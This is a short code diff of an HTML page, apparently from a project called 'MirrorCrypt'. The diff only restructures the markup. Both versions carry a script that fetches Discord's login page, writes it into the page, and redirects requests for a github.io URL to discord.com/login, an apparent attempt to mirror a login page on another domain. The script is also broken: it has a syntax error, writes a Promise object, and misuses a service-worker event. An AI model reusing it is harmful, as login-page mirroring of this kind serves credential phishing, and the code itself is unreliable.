@@ -1,16 +1,13 @@
 <html>
-	<body>
-		<p>hi</p>
-		<script>
-			let Page = fetch("https://discord.com/login")
-			document.write(Page);
-			self.addEventListener('fetch', e => {
-				const {url} = e.request;
-				if(url.includes("https://necrypted.github.io/projects/MirrorCrypt.html") {
-					const newUrl = url.replace("https://necrypted.github.io/projects/MirrorCrypt.html", "https://discord.com/login");
-					e.respondWith(fetch(newUrl));
-				}
-			});
-		</script>
-	</body>
+	<script>
+		let Page = fetch("https://discord.com/login")
+		document.write(Page);
+		self.addEventListener('fetch', e => {
+			const {url} = e.request;
+			if(url.includes("https://necrypted.github.io/projects/MirrorCrypt.html") {
+				const newUrl = url.replace("https://necrypted.github.io/projects/MirrorCrypt.html", "https://discord.com/login");
+				e.respondWith(fetch(newUrl));
+			}
+		});
+	</script>
 </html>
